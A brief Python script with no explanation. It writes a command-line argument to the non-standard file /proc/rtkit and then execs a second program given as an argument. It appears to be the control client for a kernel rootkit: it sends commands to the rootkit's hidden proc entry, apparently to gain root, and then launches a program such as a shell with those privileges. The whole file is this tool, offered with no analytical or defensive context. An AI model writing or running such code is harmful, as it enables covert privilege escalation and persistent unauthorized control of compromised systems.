#!/usr/bin/env python
import sys
import os

def order(command):
    f = open("/proc/rtkit", "w")
    f.write(command)
    f.close()

if len(sys.argv) > 1:
    order(sys.argv[1])

if len(sys.argv) > 2:
    os.execl(sys.argv[2], "")
